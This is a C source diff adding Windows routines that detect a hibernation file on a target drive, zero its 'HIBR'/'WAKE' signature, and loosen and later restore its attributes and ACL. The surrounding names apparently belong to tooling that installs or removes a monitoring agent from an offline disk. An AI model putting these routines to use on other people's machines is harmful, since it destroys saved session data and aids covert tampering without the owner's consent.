@@ -114,3 +114,62 @@ BOOL DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struct_
 	else
 		return NULL;
 }
+
+BOOL IsHybernated(os_struct_t *os_info)
+{
+	HANDLE hfile;
+	WCHAR hyb_path[MAX_PATH];
+	BYTE buff[4];
+	DWORD dummy;
+	
+	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
+	hfile = CreateFile(hyb_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE) 
+		return FALSE;
+
+	if (!ReadFile(hfile, buff, 4, &dummy, NULL)) {
+		CloseHandle(hfile);
+		return FALSE;
+	}
+
+	CloseHandle(hfile);
+
+	if (!memcmp(buff, "HIBR", 4) || !memcmp(buff, "hibr", 4) || !memcmp(buff, "WAKE", 4) || !memcmp(buff, "wake", 4))
+		return TRUE;
+
+	return FALSE;
+}
+
+void InvalidateHybernated(os_struct_t *os_info)
+{
+	HANDLE hfile;
+	WCHAR hyb_path[MAX_PATH];
+	BYTE buff[4];
+	DWORD dummy;
+
+	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
+	hfile = CreateFile(hyb_path, GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE)
+		return;
+
+	ZeroMemory(buff, 4);
+	WriteFile(hfile, buff, 4, &dummy, NULL);
+	CloseHandle(hfile);
+}
+
+void RestoreHybernationPermissions(os_struct_t *os_info)
+{
+	WCHAR hyb_path[MAX_PATH];
+	
+	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
+	SetFileAttributes(hyb_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);
+}
+
+void ModifyHybernationPermissions(os_struct_t *os_info)
+{
+	WCHAR hyb_path[MAX_PATH];
+	
+	swprintf_s(hyb_path, sizeof(hyb_path)/sizeof(hyb_path[0]), L"%shiberfil.sys", os_info->drive);
+	SetFileAttributes(hyb_path, FILE_ATTRIBUTE_NORMAL);
+	AddAceToObjectsSecurityDescriptor(hyb_path, SE_FILE_OBJECT, L"System", TRUSTEE_IS_NAME, STANDARD_RIGHTS_ALL, GRANT_ACCESS, CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE); 
+}
